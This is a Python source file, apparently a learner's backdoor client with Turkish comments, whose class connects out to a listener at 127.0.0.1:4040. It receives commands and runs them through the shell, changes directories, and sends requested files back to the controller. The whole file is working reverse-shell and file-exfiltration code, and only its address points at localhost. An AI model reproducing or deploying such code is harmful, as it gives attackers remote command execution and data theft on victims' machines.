import socket
import json
import subprocess
import os

# def execute_command(command):
#     return subprocess.check_output(command, shell=True)

class ihsanbey:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))


    def reliable_send(self, data):
        json_data = json.dumps(data)
        byte_data = json_data.encode("utf-8")
        self.connection.send(byte_data)


    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                chunk = self.connection.recv(1024)
                if not chunk:
                    break
                json_data += chunk
                decoded_data = json_data.decode("utf-8")
                return json.loads(decoded_data)
            except ValueError:
                continue



    def change_dir(self, path):
         os.chdir(path)
         return "[+] Changing working directory to: " + path


    def execute_command(self, command):
        try:
            if os.path.isdir(command):  
                return "beyler" 
            else:
                return subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError as e:
            return str(e).encode('utf-8')
        except Exception as e:
            return ("Beklenmedik bir hata oluştu: " + str(e)).encode('utf-8')


    def read_file(self, path):
        #with open(path, "rb+") as file:
        with open(path, "rb+") as file:
            x = file.read()
            print(x)
            return x 
            

    def run(self):
        while True:
            command = self.reliable_receive()
            
            if command == "!stop":
                self.connection.close()
                exit()

            elif command.startswith("cd "):
                path = " ".join(command.split(" ")[1:])
                try: 
                    command_result =  self.change_dir(path)
                    self.reliable_send(command_result)
                except FileNotFoundError:
                    return print("Eksik dosya ismi / dosya bulunamadı")
                
            elif command.startswith("download"):
                wanted_file_command = command.split(" ")
                print(wanted_file_command) #dosyanın içinde olanları yazdır ki doğru çalışıyor mu gör
                content = self.read_file(wanted_file_command[1])
                self.reliable_send(content)
            else:
                try:    
                    resultt = self.execute_command(command.encode("utf-8"))
                    self.reliable_send(resultt.decode("utf-8"))
                except BrokenPipeError:
                    print("Karşı Taraftaki Bağlantı kesildi")
                    break
            # except TypeError:
            #     print("type error")
            #     break

                



new_door = ihsanbey("127.0.0.1", 4040)
new_door.run()



